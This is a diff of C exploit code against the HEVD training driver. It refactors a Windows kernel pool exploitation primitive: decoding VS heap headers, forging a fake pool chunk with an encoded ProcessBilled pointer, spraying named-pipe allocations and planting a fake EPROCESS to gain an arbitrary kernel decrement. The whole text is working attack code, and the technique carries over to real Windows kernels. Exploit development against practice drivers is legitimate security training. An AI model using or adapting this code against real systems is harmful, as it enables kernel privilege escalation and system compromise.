@@ -9,22 +9,94 @@
 #include "pipe_utils/pipe_utils.h"
 #include "hevd/hevd.h"
 
-uintptr_t allocFakeEprocess(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs, char* fake_eprocess_buf)
+vs_chunk_t g_fake_process_billed_chunk = { 0 };
+
+uintptr_t locateVsSubSegment(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
 {
-    // Set attribute name
+    size_t vs_header_addr = addrs->ghost_vs_chunk + NEXT_CHUNK_OFFSET;
+
+    while (true)
+    {
+        uint64_t encoded_vs_header[2];
+
+        ArbitraryRead(&pipes->ghost_chunk_pipe, vs_header_addr, (char*)&encoded_vs_header, sizeof(uint64_t));
+        ArbitraryRead(&pipes->ghost_chunk_pipe, vs_header_addr + 8, (char*)(&encoded_vs_header) + 8, sizeof(uint64_t));
+
+        encoded_vs_header[0] = encoded_vs_header[0] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;
+        encoded_vs_header[1] = encoded_vs_header[1] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;
+
+        HEAP_VS_CHUNK_HEADER* vs_header = (HEAP_VS_CHUNK_HEADER*)&encoded_vs_header;
+        printf("[*] vs_header_addr: 0x%llX\n\theader->Allocated: 0x%x\n\theader->UnsafePrevSize: 0x%x\n\theader->UnsafeSize: 0x%x\n\theader->EncodedSegmentPageOffset: 0x%x\n",
+            vs_header_addr, vs_header->Allocated, vs_header->UnsafePrevSize, vs_header->UnsafeSize, vs_header->EncodedSegmentPageOffset);
+
+        if (vs_header->Allocated)
+        {
+            uintptr_t vs_sub_segment = vs_header_addr - ((uintptr_t)vs_header->EncodedSegmentPageOffset << 12) & ~0xfffll;
+            printf("[+] vs_sub_segment: 0x%llX\n", vs_sub_segment);
+
+            return vs_sub_segment;
+        }
+
+        vs_header_addr += vs_header->UnsafeSize * 0x10;
+    }
+}
+
+void constructFakeVsChunk(exploit_addresses_t* addrs, uintptr_t vs_sub_segment)
+{
+    HEAP_VS_CHUNK_HEADER new_vs_header = { 0 };
+    new_vs_header.Allocated = 0x1;
+    new_vs_header.UnsafePrevSize = PREV_CHUNK_OFFSET / 0x10;
+    new_vs_header.UnsafeSize = NEXT_CHUNK_OFFSET / 0x10;
+    new_vs_header.EncodedSegmentPageOffset = (addrs->ghost_vs_chunk - vs_sub_segment) >> 12 & 0xff;
+
+    uint64_t* new_encoded_vs_header = (uint64_t*)&new_vs_header;
+    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;
+    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;
+
+    g_fake_process_billed_chunk.encoded_vs_header[0] = new_encoded_vs_header[0];
+    g_fake_process_billed_chunk.encoded_vs_header[1] = new_encoded_vs_header[1];
+    g_fake_process_billed_chunk.pool_header.PreviousSize = 0;
+    g_fake_process_billed_chunk.pool_header.PoolIndex = 0;
+    g_fake_process_billed_chunk.pool_header.BlockSize = 0x100 / 0x10;
+    g_fake_process_billed_chunk.pool_header.PoolType = 8;
+    g_fake_process_billed_chunk.pool_header.PoolTag = 0x42424242;
+    g_fake_process_billed_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
+    g_fake_process_billed_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
+    g_fake_process_billed_chunk.pipe_queue_entry.linkedIRP = 0;
+    g_fake_process_billed_chunk.pipe_queue_entry.SecurityClientContext = 0;
+    g_fake_process_billed_chunk.pipe_queue_entry.isDataInKernel = 0;
+    g_fake_process_billed_chunk.pipe_queue_entry.DataSize = PIPE_QUEUE_ENTRY_BUFSIZE(GHOST_BLOCK_SIZE);
+    g_fake_process_billed_chunk.pipe_queue_entry.remaining_bytes = PIPE_QUEUE_ENTRY_BUFSIZE(GHOST_BLOCK_SIZE);
+    g_fake_process_billed_chunk.pipe_queue_entry.field_2C = 0;
+}
+
+int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
+{
+    puts("[*] Searching for allocated VS header to locate subsegment...");
+    uintptr_t vs_sub_segment = locateVsSubSegment(pipes, addrs);
+
+    puts("[*] Constructing fake VS chunk");
+    constructFakeVsChunk(addrs, vs_sub_segment);
+
+    return 1;
+}
+
+uintptr_t allocFakeEprocessInPagedPool(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs, char* fake_eprocess_buf)
+{
+    // Prepare the attribute data: name + fake EPROCESS
     char fake_eprocess_attribute[0x1000] = { 0 };
     memcpy(fake_eprocess_attribute + DUMB_ATTRIBUTE_NAME_LEN, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
     strcpy_s(fake_eprocess_attribute, DUMB_ATTRIBUTE_NAME_LEN, DUMB_ATTRIBUTE_NAME);
 
-    // Store arbitrary data in the kernel using a pipe attribute, as the pipe queue entry list is corrupted
+    // Set the attribute on the pipe, storing data in PagedPool
     SetPipeAttribute(ghost_pipe, fake_eprocess_attribute, DUMB_ATTRIBUTE_NAME_LEN + FAKE_EPROCESS_SIZE);
 
-    // Locate the attribute containing our arbitrary data by reading the Blink pointer of the root
+    // Read the Blink of the root pipe attribute to find our new attribute
     uintptr_t fake_eprocess_attribute_addr;
     ArbitraryRead(ghost_pipe, addrs->root_pipe_attribute + offsetof(LIST_ENTRY, Blink), (char*)&fake_eprocess_attribute_addr, 0x8);
     printf("[+] fake_eprocess_attribute: 0x%llx\n", fake_eprocess_attribute_addr);
 
-    // Retrieve the address of the fake EPROCESS from the AttributeValue field of the pipe attribute
+    // Read the AttributeValue field to get the address of our fake EPROCESS
     uintptr_t fake_eprocess;
     ArbitraryRead(ghost_pipe, fake_eprocess_attribute_addr + offsetof(pipe_attribute_t, AttributeValue), (char*)&fake_eprocess, 0x8);
     return fake_eprocess + FAKE_EPROCESS_OFFSET;
@@ -50,89 +122,34 @@ int setupFakeEprocess(char* fake_eprocess_buf, uintptr_t addr_to_decrement)
     return 1;
 }
 
-int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
+void setFakeProcessBilled(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t fake_eprocess)
 {
-    ArbitraryRead(pipes->ghost_pipe, addrs->kernel_base + nt_RtlpHpHeapGlobals_OFFSET, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
-    printf("[+] RtlpHpHeapGlobals: 0x%llx\n", addrs->RtlpHpHeapGlobals);
+    g_fake_process_billed_chunk.pool_header.ProcessBilled = fake_eprocess ^ addrs->ExpPoolQuotaCookie ^ (addrs->ghost_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER));
 
-    puts("[*] Searching for allocated VS header to locate subsegment...");
-    size_t vs_header_addr = addrs->ghost_vs_chunk + NEXT_CHUNK_OFFSET;
-    addrs->vs_sub_segment = 0;
+    uintptr_t pipe_queue_entry_addr = NULL;
     do
     {
-        uint64_t encoded_vs_header[2];
-
-        ArbitraryRead(pipes->ghost_pipe, vs_header_addr, (char*)&encoded_vs_header, sizeof(uint64_t));
-        ArbitraryRead(pipes->ghost_pipe, vs_header_addr + 8, (char*)(&encoded_vs_header) + 8, sizeof(uint64_t));
-
-        encoded_vs_header[0] = encoded_vs_header[0] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;
-        encoded_vs_header[1] = encoded_vs_header[1] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;
-
-        HEAP_VS_CHUNK_HEADER* vs_header = (HEAP_VS_CHUNK_HEADER*)&encoded_vs_header;
-        printf("[*] vs_header_addr: 0x%llX\n\theader->Allocated: 0x%x\n\theader->UnsafePrevSize: 0x%x\n\theader->UnsafeSize: 0x%x\n\theader->EncodedSegmentPageOffset: 0x%x\n",
-            vs_header_addr, vs_header->Allocated, vs_header->UnsafePrevSize, vs_header->UnsafeSize, vs_header->EncodedSegmentPageOffset);
-
-        if (vs_header->Allocated)
-        {
-            addrs->vs_sub_segment = vs_header_addr - ((uintptr_t)vs_header->EncodedSegmentPageOffset << 12) & ~0xfffll;
-            printf("[+] vs_sub_segment: 0x%llX\n", addrs->vs_sub_segment);
-        }
-
-        vs_header_addr += vs_header->UnsafeSize * 0x10;
-    } while (!addrs->vs_sub_segment);
-
-    return 1;
+        FreeNPPNxChunk(pipes->previous_chunk_pipe, VULN_BLOCK_SIZE);
+        pipes->previous_chunk_pipe = AllocNPPNxChunk(&g_fake_process_billed_chunk, VULN_BLOCK_SIZE);
+        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
+    } while (pipe_queue_entry_addr != 0x4141414141414141);
 }
 
 int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t addr_to_decrement)
 {
-    // Prepare fake EPROCESS attribute
+    puts("[*] Preparing fake EPROCESS attribute");
     char fake_eprocess_buf[0x1000] = { 0 };
     setupFakeEprocess(fake_eprocess_buf, addr_to_decrement - 0x1);
 
-    // Allocate and locate fake EPROCESS
-    addrs->fake_eprocess = allocFakeEprocess(pipes->ghost_pipe, addrs, fake_eprocess_buf);
-    printf("[+] Fake EPROCESS address: 0x%llX\n", addrs->fake_eprocess);
-
-    HEAP_VS_CHUNK_HEADER new_vs_header = { 0 };
-    new_vs_header.Allocated = 0x1;
-    new_vs_header.UnsafePrevSize = PREV_CHUNK_OFFSET / 0x10;
-    new_vs_header.UnsafeSize = NEXT_CHUNK_OFFSET / 0x10;
-    new_vs_header.EncodedSegmentPageOffset = (addrs->ghost_vs_chunk - addrs->vs_sub_segment) >> 12 & 0xff;
-
-    uint64_t* new_encoded_vs_header = (uint64_t*)&new_vs_header;
-    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;
-    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;
-
-    vs_chunk_t fake_process_billed_chunk = { 0 };
-    fake_process_billed_chunk.encoded_vs_header[0] = new_encoded_vs_header[0];
-    fake_process_billed_chunk.encoded_vs_header[1] = new_encoded_vs_header[1];
-    fake_process_billed_chunk.pool_header.PreviousSize = 0;
-    fake_process_billed_chunk.pool_header.PoolIndex = 0;
-    fake_process_billed_chunk.pool_header.BlockSize = 0x100 / 0x10;
-    fake_process_billed_chunk.pool_header.PoolType = 8;
-    fake_process_billed_chunk.pool_header.PoolTag = 0x42424242;
-    fake_process_billed_chunk.pool_header.ProcessBilled = addrs->fake_eprocess ^ addrs->ExpPoolQuotaCookie ^ (addrs->ghost_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER));
-    fake_process_billed_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
-    fake_process_billed_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
-    fake_process_billed_chunk.pipe_queue_entry.linkedIRP = 0;
-    fake_process_billed_chunk.pipe_queue_entry.SecurityClientContext = 0;
-    fake_process_billed_chunk.pipe_queue_entry.isDataInKernel = 0;
-    fake_process_billed_chunk.pipe_queue_entry.DataSize = 0;
-    fake_process_billed_chunk.pipe_queue_entry.remaining_bytes = 0;
-    fake_process_billed_chunk.pipe_queue_entry.field_2C = 0x43434343;
+    puts("[*] Allocating fake EPROCESS");
+    uintptr_t fake_eprocess = allocFakeEprocessInPagedPool(&pipes->ghost_chunk_pipe, addrs, fake_eprocess_buf);
+    printf("[+] Fake EPROCESS address: 0x%llX\n", fake_eprocess);
 
     puts("[*] Spraying pipes with fake ProcessBilled...");
-    uintptr_t pipe_queue_entry_addr = NULL;
-    do
-    {
-        FreeNPPNxChunk(pipes->previous_pipe, TARGETED_VULN_SIZE - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(pipe_queue_entry_t));
-        AllocNPPNxChunk(pipes->previous_pipe, &fake_process_billed_chunk, TARGETED_VULN_SIZE - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(pipe_queue_entry_t));
-        ArbitraryRead(pipes->ghost_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
-    } while (pipe_queue_entry_addr == addrs->ghost_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER));
+    setFakeProcessBilled(pipes, addrs, fake_eprocess);
 
     puts("[*] Freeing ghost chunk to trigger arbitrary decrement");
-    FreeNPPNxChunk(pipes->ghost_pipe, GHOST_CHUNK_BUFSIZE);
+    FreeNPPNxChunk(pipes->ghost_chunk_pipe, GHOST_BLOCK_SIZE);
 
     return 1;
 }
